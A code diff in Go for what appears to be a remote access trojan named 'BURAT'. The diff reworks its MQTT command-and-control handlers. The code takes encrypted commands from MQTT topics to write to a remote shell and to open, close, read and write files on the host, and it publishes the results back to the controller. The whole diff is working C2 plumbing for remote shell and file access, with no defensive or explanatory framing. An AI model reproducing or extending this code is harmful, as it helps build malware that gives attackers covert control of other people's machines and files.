@@ -35,10 +35,10 @@ CrP1DfupsO/t4iIRmwvB34WVjkJ7lPpZmpcsbLlVugNYJzT7jfunncMoFJ74dcJ+
 		"remoteshell_evt_write":	"bu/bushi/BURAT/bushido/remoteshell/+/evt/write",
 		"remoteshell_evt_error":	"bu/bushi/BURAT/bushido/remoteshell/+/evt/error",
 		"filerw":									"bu/bushi/BURAT/bushido/filerw/+",
-		"filerw_cmd_open":				"bu/bushi/BURAT/bushido/filerw/+/cmd/open",
-		"filerw_cmd_close":				"bu/bushi/BURAT/bushido/filerw/+/cmd/close",
 		"filerw_cmd_read":				"bu/bushi/BURAT/bushido/filerw/+/cmd/read",
 		"filerw_cmd_write":				"bu/bushi/BURAT/bushido/filerw/+/cmd/write",
+		"filerw_evt_open":				"bu/bushi/BURAT/bushido/filerw/+/evt/open",
+		"filerw_evt_close":				"bu/bushi/BURAT/bushido/filerw/+/evt/close",
 		"filerw_evt_read":				"bu/bushi/BURAT/bushido/filerw/+/evt/read",
 		"filerw_evt_write":				"bu/bushi/BURAT/bushido/filerw/+/evt/write",
 		"filerw_evt_error":				"bu/bushi/BURAT/bushido/filerw/+/evt/error",
@@ -66,16 +66,20 @@ CrP1DfupsO/t4iIRmwvB34WVjkJ7lPpZmpcsbLlVugNYJzT7jfunncMoFJ74dcJ+
 		burat.Bushido().RemoteShell.Write(packet.Id, packet.Data)
 	})
 
-	burat.AddTopicCallback("filerw_cmd_open", func (client mqtt.Client, message mqtt.Message) {
-		var packet packets.FilerwOpenPacket
-		burat.Decryse(message.Payload(), &packet)
-		burat.Bushido().FileRW.Open(packet.Id, packet.Path)
-	})
-
-	burat.AddTopicCallback("filerw_cmd_close", func (client mqtt.Client, message mqtt.Message) {
-		var packet packets.FilerwClosePacket
-		burat.Decryse(message.Payload(), &packet)
-		burat.Bushido().FileRW.Close(packet.Id)
+	burat.AddTopicCallback("filerw", func (client mqtt.Client, message mqtt.Message) {
+		if len(message.Payload()) != 0  {
+			var packet packets.FilerwPacket
+			burat.Decryse(message.Payload(), &packet)
+			burat.Bushido().FileRW.Open(packet.Id, packet.Path)
+		} else {
+			id := (strings.Split(message.Topic(), "/"))[5]
+			files := burat.Bushido().FileRW.Files()
+			for _, f := range files {
+				if burat.Internals().Digest.Digest(f.Id()) == id {
+					burat.Bushido().FileRW.Close(f.Id())
+				}
+			}
+		}
 	})
 
 	burat.AddTopicCallback("filerw_cmd_read", func (client mqtt.Client, message mqtt.Message) {
@@ -122,21 +126,14 @@ CrP1DfupsO/t4iIRmwvB34WVjkJ7lPpZmpcsbLlVugNYJzT7jfunncMoFJ74dcJ+
 
 	burat.Bushido().FileRW.OnOpen(func (id string) {
 		fmt.Println("filerw.open", id)
-		files := burat.Bushido().FileRW.Files()
-		for _, f := range files {
-			if f.Id() == id {
-				packet := burat.Seen(packets.FilerwOnOpenPacket {
-					Id: id,
-					Path: f.Path(),
-				})
-				burat.Publish(id, "filerw", 2, true, packet)
-			}
-		}
+		packet := burat.Seen(packets.FilerwOnOpenPacket {	Id: id })
+		burat.Publish(id, "filerw_evt_open", 2, false, packet)
 	})
 
 	burat.Bushido().FileRW.OnClose(func (id string) {
 		fmt.Println("filerw.close", id)
-		burat.Publish(id, "filerw", 2, true, nil)
+		packet := burat.Seen(packets.FilerwOnOpenPacket {	Id: id })
+		burat.Publish(id, "filerw_evt_close", 2, false, packet)
 	})
 
 	burat.Bushido().FileRW.OnRead(func (id string, data []byte, offset int) {
